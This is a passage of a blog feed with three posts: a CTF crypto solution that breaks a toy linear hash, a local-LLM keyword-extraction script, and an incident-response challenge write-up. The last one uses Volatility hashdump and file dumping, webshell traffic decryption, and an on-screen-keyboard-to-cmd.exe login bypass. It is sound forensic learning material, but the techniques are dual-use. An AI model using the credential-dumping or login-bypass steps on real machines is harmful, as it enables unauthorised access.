class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;SUCTF&#123;??????????????????????????????&#125;&#x27;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">myhash</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,n</span>):<br>        <span class="hljs-variable language_">self</span>.g = <span class="hljs-number">91289086035117540959154051117940771730039965839291520308840839624996039016929</span><br>        <span class="hljs-variable language_">self</span>.n = n<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">self,msg: <span class="hljs-built_in">bytes</span></span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(msg)):<br>            <span class="hljs-variable language_">self</span>.n = <span class="hljs-variable language_">self</span>.g * (<span class="hljs-number">2</span> * <span class="hljs-variable language_">self</span>.n + msg[i])<br>            <span class="hljs-variable language_">self</span>.n = <span class="hljs-variable language_">self</span>.n &amp; ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">383</span>) - <span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">digest</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">return</span> ((<span class="hljs-variable language_">self</span>.n - <span class="hljs-number">0xd1ef3ad53f187cc5488d19045</span>) % (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">128</span>)).to_bytes(<span class="hljs-number">16</span>,<span class="hljs-string">&quot;big&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">x, y</span>):<br>    x = <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">16</span>-<span class="hljs-built_in">len</span>(x)) + x<br>    y = <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">16</span>-<span class="hljs-built_in">len</span>(y)) + y<br>    <span class="hljs-keyword">return</span> long_to_bytes(bytes_to_long(<span class="hljs-built_in">bytes</span>([a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(x, y)])))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">msg, n0</span>):<br>    h = myhash(n0)<br>    ret = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0</span>] * <span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> msg:<br>        h.update(<span class="hljs-built_in">bytes</span>([b]))<br>        ret = xor(ret,h.digest())<br>    <span class="hljs-keyword">return</span> ret<br><br>n0 = getRandomNBitInteger(<span class="hljs-number">382</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n0 = &quot;</span>,n0)<br>your_input = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;give me your msg -&gt;&quot;</span>).strip())<br><span class="hljs-keyword">if</span> fn(your_input, n0) == <span class="hljs-string">b&#x27;justjusthashhash&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;try again?&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="解题-4"><a class="markdownIt-Anchor" href="#解题-4"></a> 解题</h4><p>（环境没了，自己搭的有问题，所以直接用程序跑了）<br />直接抄鸡块师傅的了，还是一知半解状态。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">myhash</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,n</span>):<br>        <span class="hljs-variable language_">self</span>.g = <span class="hljs-number">91289086035117540959154051117940771730039965839291520308840839624996039016929</span><br>        <span class="hljs-variable language_">self</span>.n = n<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">self,msg: <span class="hljs-built_in">bytes</span></span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(msg)):<br>            <span class="hljs-variable language_">self</span>.n = <span class="hljs-variable language_">self</span>.g * (<span class="hljs-number">2</span> * <span class="hljs-variable language_">self</span>.n + msg[i])<br>            <span class="hljs-variable language_">self</span>.n = <span class="hljs-variable language_">self</span>.n &amp; ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">383</span>) - <span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">digest</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>((<span class="hljs-variable language_">self</span>.n - <span class="hljs-number">0xd1ef3ad53f187cc5488d19045</span>) % (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">128</span>)).to_bytes(<span class="hljs-number">16</span>,<span class="hljs-string">&quot;big&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">x, y</span>):<br>    x = <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">16</span>-<span class="hljs-built_in">len</span>(x)) + x<br>    y = <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">16</span>-<span class="hljs-built_in">len</span>(y)) + y<br>    <span class="hljs-keyword">return</span> long_to_bytes(bytes_to_long(<span class="hljs-built_in">bytes</span>([a ^^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(x, y)])))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">msg, n0</span>):<br>    h = myhash(n0)<br>    ret = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0</span>] * <span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> msg:<br>        h.update(<span class="hljs-built_in">bytes</span>([b]))<br>        ret = xor(ret,h.digest())<br>    <span class="hljs-keyword">return</span> ret<br><br><br><br>n0 = getRandomNBitInteger(<span class="hljs-number">382</span>)  <span class="hljs-comment"># 当作接收</span><br><span class="hljs-comment"># 消除n0的影响,作为初始状态</span><br>t = (bytes_to_long(fn(<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">128</span>, n0))) % <span class="hljs-number">2</span>^<span class="hljs-number">128</span><br><br><span class="hljs-comment"># 用 初始状态 异或 最终状态 得到 fn(输入状态)</span><br>R = vector(GF(<span class="hljs-number">2</span>), <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">bin</span>((bytes_to_long(<span class="hljs-string">b&quot;justjusthashhash&quot;</span>) ^^ t) % <span class="hljs-number">2</span>^<span class="hljs-number">128</span>)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">128</span>))))<br><br><span class="hljs-comment"># 因为myhash是线性变化所以可以直接利用矩阵求解</span><br><span class="hljs-comment"># + b&quot;\x00&quot;*128 也是为了消除n0的影响</span><br>L = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>    temp = long_to_bytes(i, <span class="hljs-number">1</span>) + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">128</span><br>    L.append(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">bin</span>(bytes_to_long(fn(temp, <span class="hljs-number">0</span>)))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">128</span>))))<br>L = Matrix(GF(<span class="hljs-number">2</span>), L)<br>res = L.solve_left(R)<br><br>msg = <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">128</span><br><span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(res):<br>    <span class="hljs-keyword">if</span>(j == <span class="hljs-number">1</span>):<br>        msg += (long_to_bytes(i, <span class="hljs-number">1</span>) + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">128</span>)<br><span class="hljs-built_in">print</span>(fn(msg,n0))<br><span class="hljs-built_in">print</span>(fn(msg, n0) == <span class="hljs-string">b&quot;justjusthashhash&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>提取学术论文中的KEYWORDS</title>
    <link href="/2025/01/08/expdfkey/"/>
    <url>/2025/01/08/expdfkey/</url>
    
    <content type="html"><![CDATA[<p>由于不同期刊和不同作者对学术论文中keywords部分要求不同，直接写程序提取很难做到普适性（也可能是我太菜了），然后就尝试了一下直接使用大模型进行提取，发现效果还不错，顺便就搞一下本地大模型。目前找了IEEE、ACM、springer这三个期刊的几篇文章，效果很好，应该只要标准点的都行。</p><p>这里使用ollama，安装方便且拉取模型也很方便。具体安装方法我就不说了，很简单，网上教程也很多了，主要就是修改存储路径啥的，这里就帖一下我的环境变量。<strong>注意，想要IP调用需要设置OLLAMA_HOST。</strong></p><p><img src="/imgs/expdfkey/1.png" alt="" /></p><p>我这里找的模型是qwen2.5:14b，其他模型没有尝试<code>ollama pull qwen2.5:14b</code>。</p><p>之后在命令上输入<code>ollama serve</code>，启动ollama服务，后面程序将调用本地接口。</p><p>下面是python代码（结合GPT），首先处理论文的PDF格式，这里使用PyMuPDF(fitz)<code>pip install PyMuPDF</code>这个库来处理，感觉效果比较好，然后处理出第一页（大部分论文的关键词应该都在第一页）,处理成文本数据，发给ollama的API接口，选择模型，自己调了一下提示词，然后等待输出（平均10s,3050ti硬跑。）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> fitz<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment"># 提取PDF文本</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_text</span>(<span class="hljs-params">pdf_path</span>):<br>    doc = fitz.<span class="hljs-built_in">open</span>(pdf_path)  <span class="hljs-comment"># 打开PDF文件</span><br>    remaining_text = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> doc:<br>        blocks = page.get_text(<span class="hljs-string">&quot;dict&quot;</span>)[<span class="hljs-string">&quot;blocks&quot;</span>]<br>        <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>            <span class="hljs-keyword">if</span> block[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-number">0</span>:  <span class="hljs-comment"># 只处理文本块</span><br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> block[<span class="hljs-string">&#x27;lines&#x27;</span>]:<br>                    <span class="hljs-keyword">for</span> span <span class="hljs-keyword">in</span> line[<span class="hljs-string">&#x27;spans&#x27;</span>]:<br>                        text = span[<span class="hljs-string">&#x27;text&#x27;</span>]<br>                        span_rect = fitz.Rect(span[<span class="hljs-string">&#x27;bbox&#x27;</span>])<br>                        remaining_text += (text+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 只处理第一页</span><br>    <span class="hljs-keyword">return</span> remaining_text<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ollama_extract_keywords</span>(<span class="hljs-params">url,text</span>):<br>    api=url<br>    data=&#123;<br>        <span class="hljs-string">&quot;model&quot;</span>: <span class="hljs-string">&quot;qwen2.5:14b&quot;</span>,<br>        <span class="hljs-string">&quot;stream&quot;</span>: <span class="hljs-literal">False</span>,<br>        <span class="hljs-string">&quot;messages&quot;</span>: [<br>            &#123;<br>                <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>, <br>                <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">f&quot;On the first page of a paper, please extract all the keywords that come with it, only the keywords written by the author in the keyword section, and only tell me the results. Remember to remove all symbols, do not reply to other messages, and use commas to separate each keyword:\n<span class="hljs-subst">&#123;text&#125;</span>&quot;</span><br>            &#125;<br>        ],<br>        <span class="hljs-string">&quot;options&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;temperature&quot;</span>: <span class="hljs-number">0</span><br>        &#125;<br>    &#125;<br>    res=requests.post(url,json=data)<br>    <span class="hljs-keyword">if</span> res.status_code==<span class="hljs-number">200</span>:<br>        keywords=res.json()<br>        <span class="hljs-keyword">return</span> keywords[<span class="hljs-string">&#x27;message&#x27;</span>][<span class="hljs-string">&#x27;content&#x27;</span>].strip()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> NULL<br><span class="hljs-comment"># 处理文件夹中的所有PDF文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_pdfs_in_folder</span>(<span class="hljs-params">url, file_path</span>):<br>        <br>    <span class="hljs-comment"># 提取PDF文本</span><br>    text = extract_text(file_path)<br><br>    results = []<br><br>    <span class="hljs-comment"># 调用 Ollama 模型获取关键词</span><br><br>    <span class="hljs-comment"># 解析返回的结果并提取关键词</span><br>    keywords_str = ollama_extract_keywords(url, text)<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> keywords_str:<br>        keywords_str = ollama_extract_keywords(url, text)<br>    keywords_list = process_keywords(keywords_str)  <span class="hljs-comment"># 处理关键词字符串，返回列表</span><br>    results = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> keywords_list:<br>        results.append(i.lower().replace(<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>))<br><br>    <br>    <span class="hljs-keyword">return</span> results<br><br><span class="hljs-comment"># 处理返回的关键词字符串并将其转换为列表</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_keywords</span>(<span class="hljs-params">keywords_str</span>):<br>    <span class="hljs-comment"># 假设关键词以逗号分隔</span><br>    keywords = [keyword.strip() <span class="hljs-keyword">for</span> keyword <span class="hljs-keyword">in</span> keywords_str.split(<span class="hljs-string">&#x27;,&#x27;</span>)]<br>    <span class="hljs-keyword">return</span> keywords<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    parser = argparse.ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">&quot;-f&quot;</span>, <span class="hljs-string">&quot;--file&quot;</span>, required=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Path of the PDF files&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-u&quot;</span>, <span class="hljs-string">&quot;--url&quot;</span>, required=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;OLLAMA API URL&quot;</span>)<br>    args = parser.parse_args()<br><br>    file_path = args.file<br>    api_url = args.url<br><br>    results = process_pdfs_in_folder(api_url, file_path)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> results:<br>        <span class="hljs-built_in">print</span>(i)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><span class="hljs-comment"># python3 1.py -f &lt;filename&gt; -u &lt;api_url&gt;</span><br></code></pre></td></tr></table></figure><p>由于我毕设是要用C写的，然后这里贴一份C调用命令获取python输出的代码。</p><p>（我不会写，都是靠GPT的，难绷的地方轻喷）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">extract_keywords_from_pdf_by_ollama</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *directoryPath, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *url, <span class="hljs-type">char</span> file_keywords[MAX_FILE_KEYWORDS][MAX_KEYWORD_LENGTH])</span><br>&#123;<br>    <span class="hljs-comment">// 定义调用 Python 脚本的命令</span><br>    <span class="hljs-type">char</span> command[<span class="hljs-number">1024</span>];<br>    <span class="hljs-built_in">snprintf</span>(command, <span class="hljs-keyword">sizeof</span>(command), <span class="hljs-string">&quot;python3 1.py -f %s/%s -u %s&quot;</span>, directoryPath, filename, url);<br><br>    FILE *fp;<br>    <span class="hljs-type">char</span> result[<span class="hljs-number">128</span>];<br><br>    <span class="hljs-comment">// 打开管道，调用Python脚本并获取输出</span><br>    fp = popen(command, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (fp == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;popen&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 读取Python脚本的输出</span><br><br>    <span class="hljs-keyword">while</span> (fgets(result, <span class="hljs-keyword">sizeof</span>(result), fp) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(result);<br>        <span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-built_in">isspace</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)result[len - <span class="hljs-number">1</span>]))<br>        &#123;<br>            len--;<br>        &#125;<br>        result[len] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <span class="hljs-built_in">strcpy</span>(file_keywords[count++], result);<br>        <span class="hljs-keyword">if</span> (count &gt;= MAX_FILE_KEYWORDS)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 关闭管道</span><br>    fclose(fp);<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ollama</tag>
      
      <tag>python</tag>
      
      <tag>keyword</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024第一届Solar杯应急响应挑战赛</title>
    <link href="/2024/12/28/solar2024/"/>
    <url>/2024/12/28/solar2024/</url>
    
    <content type="html"><![CDATA[<h1 id="2024第一届solar杯应急响应挑战赛"><a class="markdownIt-Anchor" href="#2024第一届solar杯应急响应挑战赛"></a> 2024第一届Solar杯应急响应挑战赛</h1><h2 id="内存取证"><a class="markdownIt-Anchor" href="#内存取证"></a> 内存取证</h2><h3 id="签到"><a class="markdownIt-Anchor" href="#签到"></a> 签到</h3><p>《一把梭》</p><p><img src="/imgs/solar2024/1.png" alt="1" /></p><h3 id="内存取证-2"><a class="markdownIt-Anchor" href="#内存取证-2"></a> 内存取证</h3><p>查看镜像信息，暂定镜像系统为Win7SP1x64</p><p><code>vol.exe -f SERVER-2008-20241220-162057.raw imageinfo</code></p><p><img src="/imgs/solar2024/2.png" alt="2" /></p><p>vol.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64</p><h4 id="内存取证-1"><a class="markdownIt-Anchor" href="#内存取证-1"></a> 内存取证-1</h4><p>找到rdp连接的跳板地址，通过查找网络连接情况，并且过滤RDP的3389端口，发现连接的IP</p><p><code>vol.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 netscan | grep 3389</code></p><p><img src="/imgs/solar2024/3.png" alt="3" /></p><h4 id="内存取证-2"><a class="markdownIt-Anchor" href="#内存取证-2"></a> 内存取证-2</h4><p>没限制提交次数就一个个试</p><p><img src="/imgs/solar2024/6.png" alt="6" /></p><p>后面扫命令行的时候看到了</p><p><code>vol.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 cmdscan</code></p><p><img src="/imgs/solar2024/7.png" alt="7" /></p><h4 id="内存取证-3"><a class="markdownIt-Anchor" href="#内存取证-3"></a> 内存取证-3</h4><p>攻击者获取的“FusionManager节点操作系统帐户（业务帐户）”的密码是什么</p><p>通过扫描文件，并过滤桌面，发现一个pass.txt，下载下来发现就是放密码的文件</p><p><code>vol.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 filescan | grep Desktop</code></p><p><code>vol.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e4cedd0 -D ./</code></p><p><img src="/imgs/solar2024/4.png" alt="4" /></p><p><img src="/imgs/solar2024/5.png" alt="5" /></p><h4 id="内存取证-4"><a class="markdownIt-Anchor" href="#内存取证-4"></a> 内存取证-4</h4><p>直接查找所有用户名，一个个试一下</p><p><code>vol.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</code></p><p><img src="/imgs/solar2024/8.png" alt="8" /></p><h4 id="内存取证-6"><a class="markdownIt-Anchor" href="#内存取证-6"></a> 内存取证-6</h4><p>hashdump直接找</p><p><code>vol.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 hashdump</code></p><p><img src="/imgs/solar2024/9.png" alt="9" /></p><h2 id="日志流量"><a class="markdownIt-Anchor" href="#日志流量"></a> 日志流量</h2><h3 id="日志流量-1"><a class="markdownIt-Anchor" href="#日志流量-1"></a> 日志流量-1</h3><p>根据提示，随便翻翻，看到一串base64串很奇怪，解密之后就是flag</p><p><img src="/imgs/solar2024/10.png" alt="10" /></p><p><img src="/imgs/solar2024/11.png" alt="11" /></p><h3 id="日志流量-2"><a class="markdownIt-Anchor" href="#日志流量-2"></a> 日志流量-2</h3><p>将b.jsp进行base64加密，然后在日志流量-1图中flag下面那一串十六进制就是哥斯拉解密的密码，然后使用pz-pro解密</p><p>解密成功，说明密钥正确</p><p><img src="/imgs/solar2024/12.png" alt="12" /></p><p>导出wire.pcapng的HTTP文件，逐一解密</p><p><img src="/imgs/solar2024/16.png" alt="16" /></p><h3 id="日志流量-3"><a class="markdownIt-Anchor" href="#日志流量-3"></a> 日志流量-3</h3><p>解密这个15KB的文件</p><p><img src="/imgs/solar2024/13.png" alt="13" /></p><p>是一个PDF文件，导出一下去掉前面多余部分，打开就是flag</p><p><img src="/imgs/solar2024/14.png" alt="14" /></p><p><img src="/imgs/solar2024/15.png" alt="15" /></p><h2 id="数据库"><a class="markdownIt-Anchor" href="#数据库"></a> 数据库</h2><p>前半部分参考这篇，修改屏幕键盘为cmd.exe</p><p><a href="https://www.cnblogs.com/gates/p/7510751.html">VMware虚拟机忘记开机密码怎么办 - gate_s - 博客园</a></p><p>成功</p><p><img src="/imgs/solar2024/17.png" alt="17" /></p><p>修改密码成功</p><p><img src="/imgs/solar2024/18.png" alt="18" /></p><h3 id="数据库-1"><a class="markdownIt-Anchor" href="#数据库-1"></a> 数据库-1</h3><p>事件查看器查看安全日志，过滤4720用户事件，就是第一个日志了</p><p><img src="/imgs/solar2024/19.png" alt="19" /></p><h3 id="数据库-2"><a class="markdownIt-Anchor" href="#数据库-2"></a> 数据库-2</h3><p>通过netstat查看到有一个端口很奇怪</p><p><img src="/imgs/solar2024/20.png" alt="20" /></p><p>通过netstat -ano 查看到IP地址（数据库-3）</p><p><img src="/imgs/solar2024/21.png" alt="21" /></p><p>通过tasklist查看进程信息</p><p><img src="/imgs/solar2024/22.png" alt="22" /></p><h3 id="数据库-3"><a class="markdownIt-Anchor" href="#数据库-3"></a> 数据库-3</h3><p>见数据库-2</p><h3 id="数据库-5"><a class="markdownIt-Anchor" href="#数据库-5"></a> *数据库-5</h3><p>不是这个文件？</p><p><code>Get-ChildItem -Path C:\ -Recurse -Filter &quot;jusched.exe&quot; -ErrorAction SilentlyContinue | Select-Object FullName</code></p><p><code> Get-FileHash -Path &quot;C:\Program Files\Java\latest\jre-1.8\xmrig.exe&quot; -Algorithm MD5</code></p><h2 id="综合应急"><a class="markdownIt-Anchor" href="#综合应急"></a> 综合应急</h2><p>你告诉我理论能搜到原题？？？？？？？？</p><p>这比了个寂寞</p><h3 id="理论"><a class="markdownIt-Anchor" href="#理论"></a> 理论</h3><p>都是直接猜的</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Forensics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024年度总结</title>
    <link href="/2024/12/16/2024final/"/>
    <url>/2024/12/16/2024final/</url>
    
